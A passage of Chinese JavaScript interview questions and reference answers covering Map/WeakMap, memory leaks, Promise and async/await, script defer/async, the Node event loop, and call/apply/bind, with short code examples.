add、delete、has；\n\nMap\n\n本质上是键值对的集合，类似集合；\n可以遍历，方法很多，可以跟各种数据格式转换；\n\nWeakMap\n\n只接收对象为键名（null 除外），不接受其他类型的值作为键名；\n键名指向的对象，不计入垃圾回收机制；\n不能遍历，方法同 get、set、has、delete；\n\n24、简单说说 js 中有哪几种内存泄露的情况\n意外的全局变量；\n闭包；\n未被清空的定时器；\n未被销毁的事件监听；\nDOM 引用；\n\n25、json和xml数据的区别参考答案：\n\n数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。\n数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。\n数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互\n数据描述方面：json对数据的描述性比xml较差\nxml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。\n\n26、JavaScript有几种方法判断变量的类型?参考答案：\n\n使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。\n使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。\n使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。\n\n27、MathMath 对象方法\n\n\n方法\n描述\n\n\n\nabs(x)\n返回 x 的绝对值。\n\n\nacos(x)\n返回 x 的反余弦值。\n\n\nasin(x)\n返回 x 的反正弦值。\n\n\natan(x)\n以介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间的数值来返回 x 的反正切值。\n\n\natan2(y,x)\n返回从 x 轴到点 (x,y) 的角度（介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间）。\n\n\nceil(x)\n对数进行上舍入。\n\n\ncos(x)\n返回数的余弦。\n\n\nexp(x)\n返回 Ex 的指数。\n\n\nfloor(x)\n对 x 进行下舍入。\n\n\nlog(x)\n返回数的自然对数（底为e）。\n\n\nmax(x,y,z,…,n)\n返回 x,y,z,…,n 中的最高值。\n\n\nmin(x,y,z,…,n)\n返回 x,y,z,…,n中的最低值。\n\n\npow(x,y)\n返回 x 的 y 次幂。\n\n\nrandom()\n返回 0 ~ 1 之间的随机数。\n\n\nround(x)\n四舍五入。\n\n\nsin(x)\n返回数的正弦。\n\n\nsqrt(x)\n返回数的平方根。\n\n\ntan(x)\n返回角的正切。\n\n\nMath.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)\n\n\n\n题目：\nvar min = Math.min();\nvar max = Math.max();\nconsole.log(min &lt; max);\n// 写出执行结果，并解释原因\n\n答案false\n解析\n\n按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false\nMDN 相关文档是这样解释的\nMath.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。\n而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false\n\n\n\n28、promise和 async await 区别参考答案：\n\n概念Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的\nasync await也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。\n\n两者的区别\nPromise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。\nasync await与Promise一样，是非阻塞的。\nasync await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。\n\n\n\n29、 defer和async区别参考答案：\n区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个\n解析：\n在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后\n&lt;script src=\"script.js\">&lt;/script>\n\nasync：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。但是多个js文件的加载顺序不会按照书写顺序进行\n&lt;script async src=\"script.js\">&lt;/script>\n\nderer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。\n&lt;script defer src=\"script.js\">&lt;/script>\n\n\n\n30、同步和异步参考答案：\n同步\n\n指在 主线程上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。\n也就是调用一旦开始，必须这个调用 返回结果(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。\n\n异步\n\n异步任务是指不进入主线程，而进入 任务队列的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。\n每一个任务有一个或多个 回调函数。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。\n程序的执行顺序和任务的排列顺序是不一致的，异步的。\n我们常用的setTimeout和setInterval函数，Ajax都是异步操作。\n\n31、 实现异步的方法参考答案：\n回调函数（Callback）、事件监听、发布订阅、Promise&#x2F;A+、生成器Generators&#x2F; yield、async&#x2F;await\n\nJS 异步编程进化史：callback -&gt; promise -&gt; generator -&gt; async + await\n\nasync&#x2F;await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。\n\nasync&#x2F;await可以说是异步终极解决方案了。\n(1) async&#x2F;await函数相对于Promise，优势体现在：\n\n处理 then 的调用链，能够更清晰准确的写出代码\n并且也能优雅地解决回调地狱问题。\n\n当然async&#x2F;await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。\n(2) async&#x2F;await函数对 Generator 函数的改进，体现在以下三点：\n\n内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。\n更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。\n更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。\n\n\nasync&#x2F;await\nAsync&#x2F;Await简介\n 使用async&#x2F;await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：\n\nasync&#x2F;await是基于Promise实现的，它不能用于普通的回调函数。\n\nasync&#x2F;await与Promise一样，是非阻塞的。\n\n\n3. async&#x2F;await使得异步代码看起来像同步代码，这正是它的魔力所在。\n\n一个函数如果加上 async ，那么该函数就会返回一个 Promise\nasync function async1() &#123;\n  return \"1\"\n&#125;\nconsole.log(async1()) // -> Promise &#123;&lt;resolved>: \"1\"&#125;\n\nGenerator函数依次调用三个文件那个例子用async&#x2F;await写法，只需几句话便可实现\nlet fs = require('fs')\nfunction read(file) &#123;\n  return new Promise(function(resolve, reject) &#123;\n    fs.readFile(file, 'utf8', function(err, data) &#123;\n      if (err) reject(err)\n      resolve(data)\n    &#125;)\n  &#125;)\n&#125;\nasync function readResult(params) &#123;\n  try &#123;\n    let p1 = await read(params, 'utf8')//await后面跟的是一个Promise实例\n    let p2 = await read(p1, 'utf8')\n    let p3 = await read(p2, 'utf8')\n    console.log('p1', p1)\n    console.log('p2', p2)\n    console.log('p3', p3)\n    return p3\n  &#125; catch (error) &#123;\n    console.log(error)\n  &#125;\n&#125;\nreadResult('1.txt').then( // async函数返回的也是个promise\n  data => &#123;\n    console.log(data)\n  &#125;,\n  err => console.log(err)\n)\n// p1 2.txt\n// p2 3.txt\n// p3 结束\n// 结束\n\n5.2 Async&#x2F;Await并发请求\n如果请求两个文件，毫无关系，可以通过并发请求\nlet fs = require('fs')\nfunction read(file) &#123;\n  return new Promise(function(resolve, reject) &#123;\n    fs.readFile(file, 'utf8', function(err, data) &#123;\n      if (err) reject(err)\n      resolve(data)\n    &#125;)\n  &#125;)\n&#125;\nfunction readAll() &#123;\n  read1()\n  read2()//这个函数同步执行\n&#125;\nasync function read1() &#123;\n  let r = await read('1.txt','utf8')\n  console.log(r)\n&#125;\nasync function read2() &#123;\n  let r = await read('2.txt','utf8')\n  console.log(r)\n&#125;\nreadAll() // 2.txt 3.txt\n\n\n\n\n\n32、 promise的介绍与使用Promise 介绍：\nES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。\nPromise对象, 可以将异步操作以同步的流程表达出来。使用 Promise 主要有以下好处：\n\n可以很好地解决回调地狱的问题（避免了层层嵌套的回调函数）。\n语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。\n\nPromise 使用：\n语法\nvar promise = new Promise((resolve, reject) => &#123;/* executor函数 */\n    // ... some code\n    if (/* 异步操作成功 */)&#123;\n        resolve(value);\n    &#125; else &#123;\n        reject(error);\n    &#125;\n&#125;);\npromise.then((value) => &#123;\n    //success\n&#125;, (error) => &#123;\n    //failure\n&#125;)\n\n\n参数executor 函数在Promise构造函数执行时同步执行，被传递 resolve 和 reject 函数（executor函数在Promise构造函数返回新建对象前被调用）。executor 内部通常会执行一些异步操作，一旦完成，可以调用resolve函数来将promise状态改成fulfilled(完成)，或者将promise的状态改为rejected(失败)。如果在executor函数中抛出一个错误，那么该promise 状态为rejected。executor函数的返回值被忽略。\n简单使用\n\nfunction timeout(ms) &#123;\n    return new Promise((resolve, reject) => &#123;\n        setTimeout(resolve, ms, 'done');\n    &#125;);\n&#125;\n\ntimeout(2000).then((value) => &#123;\n    console.log(value); //done\n&#125;);\n\n原型方法\nPromise.prototype.then(onFulfilled, onRejected)\n\n语法p.then(onFulfilled, onRejected);p.then((value) =&gt; &#123;// fulfillment&#125;, (reason) =&gt; &#123;// rejection&#125;);\n\n含义为 Promise实例添加状态改变时的回调函数。then方法的第一个参数是resolved状态的回调函数，第二个参数（可选）是rejected状态的回调函数。\n\n链式操作then方法返回的是一个新的promise，因此可以采用链式写法，即then方法后面再调用另一个then方法。\nnew Promise(resolve => &#123;\n    resolve(1);\n&#125;)\n    .then(result => console.log(result)) //1\n    .then(result => &#123;\n        console.log(result);              //undefined\n        return 2;\n    &#125;)\n    .then(result => &#123;\n        console.log(result);             //2\n        throw new Error(\"err\");\n    &#125;)\n    .then((result) =>&#123;\n        console.log(result);            \n    &#125;, (err)=>&#123;\n        console.log(err);                //Error: err\n        return 3;\n    &#125;)\n    .then((result) => &#123;\n        console.log(result);            //3\n    &#125;)\n\n注意：①不管是then方法的onfulfilled函数参数执行还是onrejected（可选参数）函数参数执行，then方法返回的都是一个新的Promise对象，都可以继续采用链式写法调用另一个then方法。②Promise.prototype.catch()方法返回的也是一个Promise对象。then方法和catch方法可以链式操作。\n\n返回值then方法返回一个Promise，而它的行为与then中的被调用的回调函数(onfulfilled函数&#x2F;onrejected函数)的返回值有关。(1) 如果then中的回调函数返回一个值，那么then返回的Promise将会成为接受状态，并且将返回的值作为接受状态的回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    reject();\n&#125;)\n.then( () => 99, () => 42 )\n.then( result => console.log(result)); // 42\n\n(2) 如果then中的回调函数抛出一个错误，那么then返回的Promise将会成为拒绝状态，并且将抛出的错误作为拒绝状态的回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n    .then( () => &#123;throw new Error('err')&#125;, () => &#123;&#125;)\n    .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err\n\n(3) 如果then中的回调函数返回一个已经是接受状态的Promise，那么then返回的Promise也会成为接受状态，并且将那个Promise的接受状态的回调函数的参数值作为该被返回的Promise的接受状态回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n    .then( () => &#123;\n        return new Promise(resolve => resolve('ok'));\n    &#125;)\n    .then( (result) => &#123;console.log(result)&#125;); //ok\n\n(4) 如果then中的回调函数返回一个已经是拒绝状态的Promise，那么then返回的Promise也会成为拒绝状态，并且将那个Promise的拒绝状态的回调函数的参数值作为该被返回的Promise的拒绝状态回调函数的参数值。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n    .then( () => &#123;\n        return new Promise((resolve, reject) => &#123;\n           reject(new Error('err'));\n        &#125;);\n    &#125;)\n    .then( () => &#123;&#125;, (err) => &#123;console.log(err)&#125;); //Error: err\n\n(5) 如果then中的回调函数返回一个未定状态（pending）的Promise，那么then返回Promise的状态也是未定的，并且它的终态与那个Promise的终态相同；同时，它变为终态时调用的回调函数参数与那个Promise变为终态时的回调函数的参数是相同的。\nnew Promise((resolve, reject) => &#123;\n    resolve();\n&#125;)\n.then(() => &#123;\n    return new Promise(resolve => &#123;\n        setTimeout(resolve, 2000, 'ok');\n    &#125;);\n&#125;)\n.then( (result) => &#123;console.log(result)&#125;); //ok\n\n注意：这里是then方法中被调用回调函数的返回值与then方法返回的Promise对象状态之间的关系。\n\n\nPromise.prototype.catch(onRejected)\n\n语法\np.catch(onRejected);\n\np.catch(function(reason) &#123;\n    // 拒绝\n&#125;);\n\n含义Promise.prototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数，返回一个新的promise对象。\n\n用法\nconst p = new Promise((resolve,reject) => &#123;\n    return reject(new Error('err')); //reject方法的作用，等同于抛出错误\n    //throw new Error('err');\n&#125;);\n\np.then(null, (err) => &#123;\n    console.log(err);  //Err: err\n&#125;);\n\n//--------等价写法---------\np.catch(err => &#123;\n    console.log(err); //Err: err\n&#125;)\n\n注意：由于.catch方法是.then(null, rejection)的别名，故.then中的链式操作(3)、返回值(4)等语法在.catch中都适用。\n\n一般总是建议，Promise 对象后面要跟catch方法，这样可以处理 Promise内部发生的错误。catch方法返回的还是一个 Promise 对象，因此后面还可以接着调用then方法。\n\nPromise对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。 即：当前catch方法可以捕获上一个catch方法(包括上一个catch)到当前catch(不包括当前catch)方法之间所有的错误，如果没有错误，则当前catch方法不执行。\nnew Promise(() &#x3D;&gt; &#123;\n    throw new Error(&#39;err1&#39;);\n&#125;)\n    .then(() &#x3D;&gt; &#123;console.log(1);&#125;)\n    .then(() &#x3D;&gt; &#123;console.log(2);&#125;)\n    .catch((err) &#x3D;&gt; &#123;\n        console.log(err); &#x2F;&#x2F;Err: err1\n        throw  new Error(&#39;err2&#39;);\n    &#125;)\n    .catch((err) &#x3D;&gt; &#123;console.log(err);&#125;)&#x2F;&#x2F;Err: err2\n\n一般来说，不要在then方法里面定义Reject状态的回调函数（即then的第二个参数），总是使用catch方法。\n// bad\nnew Promise()\n    .then((data) => &#123;/* success */ &#125;, (err) => &#123;/* error */ &#125;);\n\n// good\nnew Promise()\n    .then((data) => &#123; /* success */ &#125;)\n    .catch((err) => &#123;/* error */ &#125;);\n\n上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面then方法执行中的错误，也更接近同步的写法。\n\n与传统的try/catch代码块不同的是，即使没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误也不会中止外部脚本运行。\nnew Promise((resolve) => &#123;\n    // 下面一行会报错，因为x没有声明\n    resolve(x + 2);\n&#125;).then(() => &#123;\n    console.log('ok');\n&#125;);\nsetTimeout(() => &#123;console.log('over')&#125;);\n//Uncaught (in promise) ReferenceError: x is not defined\n//over\n\n在异步函数中抛出的错误不会被catch捕获到\nnew Promise((resolve, reject) &#x3D;&gt; &#123;\n    setTimeout(() &#x3D;&gt; &#123;\n        throw &#39;Uncaught Exception!&#39;;\n    &#125;, 1000);\n&#125;).catch(() &#x3D;&gt; &#123;\n    console.log(&#39;err&#39;); &#x2F;&#x2F;不会执行\n&#125;);\n\nnew Promise((resolve, reject) &#x3D;&gt; &#123;\n    setTimeout(() &#x3D;&gt; &#123;\n        reject();\n    &#125;, 1000);\n&#125;).catch(() &#x3D;&gt; &#123;\n    console.log(&#39;err&#39;); &#x2F;&#x2F;err\n&#125;);\n\n在resolve()后面抛出的错误会被忽略\nnew Promise((resolve, reject) => &#123;\n    resolve();\n    throw 'Silenced Exception!';\n&#125;).catch(function(e) &#123;\n    console.log(e); // 不会执行\n&#125;);\n\nPromise.all(iterable)\n\n语法var p = Promise.all([p1, p2, p3]);\n\n含义Promise.all方法接受一个数组作为参数，p1、p2、p3都是 Promise 实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。）p的状态由p1、p2、p3决定，分成两种情况。(1) 只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。(2) 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。\n\n用法\nconst p1 = 'p1-ok';\nconst p2 = Promise.resolve('p2-ok');\nconst p3 = new Promise((resolve) => setTimeout(resolve, 3000, 'p3-ok'));\nconst p4 = Promise.reject('p4-err');\nPromise.all([p1, p2, p3])\n    .then((resolves) => &#123;\n      resolves.forEach(resolve => &#123;\n          console.log(resolve); //p1-ok   p2-ok  p3-ok\n      &#125;);\n    &#125;)\n    .catch(() => &#123;\n      console.log('err');\n    &#125;);\n\nPromise.all([p1, p2, p3, p4])\n    .then(() => &#123;\n      console.log('ok');\n    &#125;)\n    .catch((err) => &#123;\n       console.log(err); //p4-err\n    &#125;)\n\nPromise.race(iterable)\n\n语法var p = Promise.race([p1, p2, p3]);\n\n含义Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数。Promise.race方法的参数与Promise.all方法一样，如果不是 Promise 实例，就会先调用下面讲到的Promise.resolve方法，将参数转为Promise实例，再进一步处理。\n\n用法\nvar p1 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"one\");&#125;);\nvar p2 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"two\");&#125;);\nPromise.race([p1, p2])\n    .then(value => &#123;\n        console.log(value); // \"two\"\n    &#125;);\n\nvar p3 = new Promise(resolve => &#123;setTimeout(resolve, 100, \"three\");&#125;);\nvar p4 = new Promise((resolve, reject) => &#123;setTimeout(reject, 500, \"four\");&#125;);\n\nPromise.race([p3, p4])\n    .then((value) => &#123;\n        console.log(value); // \"three\"\n    &#125;)\n    .catch(err => &#123;\n        // 未被调用  \n    &#125;);\n\nvar p5 = new Promise(resolve => &#123;setTimeout(resolve, 500, \"five\");&#125;);\nvar p6 = new Promise((resolve, reject) => &#123;\n          setTimeout(reject, 100, \"six\");\n      &#125;);\n\nPromise.race([p5, p6])\n    .then((value) => &#123;\n      // 未被调用             \n    &#125;).catch((reason) => &#123;\n        console.log(reason); // \"six\"\n    &#125;);\n\nPromise.resolve(value)\n\n语法\nPromise.resolve(value);\nPromise.resolve(promise);\nPromise.resolve(thenable);\n\nPromise.resolve等价于下面的写法。\nPromise.resolve(value) ;\n// 等价于\nnew Promise(resolve => resolve(value));\n\n含义返回一个状态由给定value决定的Promise实例。\n\n用法(1) 如果该值是一个Promise对象，则直接返回该对象；\nconst p = new Promise((resolve) => &#123;resolve()&#125;);\nconst p2 = Promise.resolve(p);\nconsole.log(p === p2); //true\n\n(2) 如果参数是thenable对象(即带有then方法的对象)，则返回的Promise对象的最终状态由then方法的执行决定；\nconst thenable = &#123;\n    then(resolve, reject) &#123;\n        resolve(42);\n    &#125;\n&#125;;\nPromise.resolve(thenable)\n    .then((value) => &#123;\n        console.log(value);  // 42\n    &#125;);\n\n(3) 如果参数是不具有then方法的对象或基本数据类型，则返回的Promise对象的状态为fulfilled，并且将该参数传递给then方法。\nPromise.resolve('Hello')\n    .then((s) => &#123;\n        console.log(s); //Hello\n    &#125;);\n\n(4) 如果不带有任何参数，则返回的Promise对象的状态为fulfilled，并且将undefined作为参数传递给then方法。\nPromise.resolve()\n    .then((s) => &#123;\n        console.log(s); //undefined\n    &#125;);\n\n通常而言，如果你不知道一个值是否是Promise对象，使用Promise.resolve(value) 来返回一个Promise对象,这样就能将该value以Promise对象形式使用。\n\n立即resolve的Promise对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。\nsetTimeout(function () &#123;\n    console.log('three');\n&#125;, 0);\n\nPromise.resolve().then( () => &#123;\n    console.log('two');\n&#125;);\n\nconsole.log('one');\n// one \n// two\n// three\n\nPromise.reject(reason)\n\n语法\nPromise.reject(reason);\n\nPromise.reject等价于下面的写法。\nvar p = Promise.reject(reason);\n// 等同于\nvar p = new Promise((resolve, reject) => reject(reason));\n\n含义返回一个状态为rejected的Promise对象，并将给定的失败信息传递给对应的处理方法。\n\n\n\n\n\n\n\n\n\n\n\n注意：Promise.resolve(value)方法返回的Promise实例的状态由value决定，可能是fulfilled，也可能是rejected。Promise.reject(reason)方法返回的Promise实例的状态一定是rejected。\n\n用法\nPromise.reject(\"Testing static reject\")\n    .then((value) => &#123;\n        // 未被调用\n    &#125;).catch((reason) => &#123;\n        console.log(reason); // Testing static reject\n    &#125;);\n\nPromise.reject(new Error(\"fail\"))\n    .then((value) => &#123;\n        // 未被调用\n    &#125;).catch((error) => &#123;\n        console.log(error); // Error: fail\n    &#125;);\n\nPromise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数。这一点与Promise.resolve方法不一致。\nconst thenable = &#123;\n    then(resolve) &#123;\n        resolve('ok');\n    &#125;\n&#125;;\n\nPromise.resolve(thenable)\n    .then(e => &#123;\n        console.log(e === 'ok'); //true\n    &#125;);\n\nPromise.reject(thenable)\n    .catch(e => &#123;\n        console.log(e === thenable); // true\n    &#125;);\n\n与promise.all相反的是哪一个\n参考答案：\nPromse.race就是赛跑的意思，意思就是说，Promise.race([p1, p2, p3])里面哪个结果获得的快，就返回那个结果，不管结果本身是成功状态还是失败状态。\n扩展：\n语法\nPromise.race(iterable);\n\n参数\n\niterable\n可迭代对象，类似Array\n\n\n返回值\n 一个待定的 Promise]只要给定的迭代中的一个promise解决或拒绝，就采用第一个promise的值作为它的值， 从而异步地解析或拒绝（一旦堆栈为空）\n33、promise实现文件读取\n// const fs = require(\"fs\");\nimport fs from \"fs\";\nimport path from \"path\";\nconst __dirname = path.resolve();\nfunction readFile(file) &#123;\n  return new Promise((resolve, reject) => &#123;\n    fs.readFile(path.join(__dirname, file), (err, data) => &#123;\n      if (data) &#123;\n        resolve(data.toString());\n      &#125; else &#123;\n        reject(err);\n      &#125;\n    &#125;);\n  &#125;);\n&#125;\n\nreadFile(\"./JavaScript/promise/file/file1.txt\")\n  .then((data) => &#123;\n    console.log(data);\n    return readFile(\"./JavaScript/promise/file/file1.txt\");\n  &#125;)\n  .then((data) => &#123;\n    console.log(data);\n  &#125;);\n\n\n\n\n33、用js实现sleep，用promisefunction SLeep_p(time) &#123;\n  return new Promise((resolve, reject) => &#123;\n    setTimeout(resolve, time);\n  &#125;);\n&#125;\n\nSLeep_p(2000).then(() => &#123;\n  console.log(\"kif\");\n&#125;);\n\n\n\n\n\n34、js执行顺序的题目，涉及到settimeout、console、process.nextTick、promise.thenconsole.time('start');\n\nsetTimeout(function() &#123;\n  console.log(2);\n&#125;, 10);\n\nsetImmediate(function() &#123;\n  console.log(1);\n&#125;);\n\nnew Promise(function(resolve) &#123;\n  console.log(3);\n  resolve();\n  console.log(4);\n&#125;).then(function() &#123;\n  console.log(5);\n  console.timeEnd('start')\n&#125;);\n\nconsole.log(6);\n\nprocess.nextTick(function() &#123;\n  console.log(7);\n&#125;);\n\nconsole.log(8);\n\n参考答案：\n综合的执行顺序就是： 3——&gt;4——&gt;6——&gt;8——&gt;7——&gt;5——&gt;start: 7.009ms——&gt;1——&gt;2\n解析：\n本题目，考察的就是 node 事件循环 Event Loop 我们可以简单理解Event Loop如下：\n\n所有任务都在主线程上执行，形成一个执行栈(Execution Context Stack)\n在主线程之外还存在一个任务队列(Task Queen),系统把异步任务放到任务队列中，然后主线程继续执行后续的任务\n一旦执行栈中所有的任务执行完毕，系统就会读取任务队列。如果这时异步任务已结束等待状态，就会从任务队列进入执行栈，恢复执行\n主线程不断重复上面的第三步\n\n在上述的例子中，我们明白首先执行主线程中的同步任务，因此依次输出3、4、6、8。当主线程任务执行完毕后，再从Event Loop中读取任务。\nEvent Loop读取任务的先后顺序，取决于任务队列（Job queue）中对于不同任务读取规则的限定。\n在Job queue中的队列分为两种类型：\n宏任务 Macrotask 宏任务是指Event Loop在每个阶段执行的任务\n微任务 Microtask 微任务是指Event Loop在每个阶段之间执行的任务\n我们举例来看执行顺序的规定，我们假设\n宏任务队列包含任务: A1, A2 , A3\n微任务队列包含任务: B1, B2 , B3\n执行顺序为，首先执行宏任务队列开头的任务，也就是 A1 任务，执行完毕后，在执行微任务队列里的所有任务，也就是依次执行B1, B2 , B3，执行完后清空微任务队中的任务，接着执行宏任务中的第二个任务A2，依次循环。\n了解完了宏任务 Macrotask和微任务 Microtask两种队列的执行顺序之后，我们接着来看，真实场景下这两种类型的队列里真正包含的任务（我们以node V8引擎为例），在node V8中，这两种类型的真实任务顺序如下所示：\n宏任务 Macrotask队列真实包含任务：\nscript(主程序代码),setTimeout, setInterval, setImmediate, I&#x2F;O, UI rendering\n\n微任务 Microtask队列真实包含任务：\nprocess.nextTick, Promises, Object.observe, MutationObserver\n\n由此我们得到的执行顺序应该为：\nscript(主程序代码)—&gt;process.nextTick—&gt;Promises...——&gt;setTimeout——&gt;setInterval——&gt;setImmediate——&gt; I&#x2F;O——&gt;UI rendering\n\n\n\n\n\n\n\n\n\n\n在ES6中宏任务 Macrotask队列又称为ScriptJobs，而微任务 Microtask又称PromiseJobs\n我们的题目相对复杂，但是要注意，我们在定义promise的时候，promise构造部分是同步执行的\n接下来我们分析我们的题目，首先分析Job queue的执行顺序：\nscript(主程序代码)——&gt;process.nextTick——&gt;promise——&gt;setTimeout——&gt;setImmediate\n\n\n主体部分： 定义promise的构造部分是同步的，因此先输出3、4 ，主体部分再输出6、8（同步情况下，就是严格按照定义的先后顺序）\nprocess.nextTick: 输出7\npromise： 这里的promise部分，严格的说其实是promise.then部分，输出的是5、以及 timeEnd(‘start’)\nsetImmediate：输出1，依据上面优先级，应该先setTimeout，但是注意，setTimeout 设置 10ms 延时\nsetTimeout ： 输出2\n\n35、call appy bind的作用和区别参考答案：\n作用：\n 都可以改变函数内部的this指向。\n区别点：\n\ncall 和 apply 会调用函数，并且改变函数内部this指向。\ncall 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg]\nbind 不会调用函数，可以改变函数内部this指向。\n\n解析：\ncall方法\n改变函数内部this指向\ncall()方法调用一个对象。简单理解为调用函数的方式，但是它可以改变函数的this指向。\n写法：fun.call(thisArg, arg1, arg3, …) &#x2F;&#x2F; thisArg为想要指向的对象，arg1,arg3为参数\ncall 的主要作用也可以实现继承\n\n\napply方法\napply()方法调用一个函数。简单理解为调用函数的方式，但是它可以改变函数的this指向。\n写法：fun.apply(thisArg, [argsArray])\n\nthisArg:在fun函数运行时指定的this值\nargsArray:传递的值，必须包含在数组里面\n返回值就是函数的返回值，因为他就是调用函数\n\napply的主要应用，比如可以利用apply可以求得数组中最大值\nconst arr &#x3D; [1, 22, 3, 44, 5, 66, 7, 88, 9];&#96;&#96;const max &#x3D; Math.max.apply(Math, arr);&#96;&#96;console.log(max);\n\nbind方法\nbind()方法不会调用函数，但是能改变函数内部this指向\n写法：fun.bind(thisArg, arg1, arg2, …)\n\nthisArg:在fun函数运行时指定的this值\narg1,arg2:传递的其他参数\n返回由指定的this值和初始化参数改造的原函数拷贝\n\nvar&#96; &#96;o &#x3D; &#123;&#96;&#96;  &#96;&#96;name: &#96;&#96;&quot;lisa&quot;&#96;&#96;&#125;;&#96;&#96;function&#96; &#96;fn() &#123;&#96;&#96;  &#96;&#96;console.log(&#96;&#96;this&#96;&#96;);&#96;&#96;&#125;&#96;&#96;var&#96; &#96;f &#x3D; fn.bind(o);&#96;&#96;f();\n\nbind应用\n如果有的函数我们不需要立即调用，但是又需要改变这个函数的this指向，此时用bind再合适不过了\nconst btns &#x3D; document.querySelectorAll(&#96;&#96;&quot;button&quot;&#96;&#96;);&#96;&#96;for&#96; &#96;(let i &#x3D; 0; i &lt; btns.length; i++) &#123;&#96;&#96;  &#96;&#96;btns[i].onclick &#x3D; &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;   &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;true&#96;&#96;;&#96;&#96;   &#96;&#96;setTimeout(&#96;&#96;    &#96;&#96;function&#96;&#96;() &#123;&#96;&#96;     &#96;&#96;this&#96;&#96;.disabled &#x3D; &#96;&#96;false&#96;&#96;;&#96;&#96;    &#96;&#96;&#125;.bind(&#96;&#96;this&#96;&#96;),&#96;&#96;    &#96;&#96;2000&#96;&#96;   &#96;&#96;);&#96;&#96;  &#96;&#96;&#125;;&#96;&#96;&#125;\n\n扩展:\n主要应用场景：\n\ncall 经常做继承。\napply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。\nbind 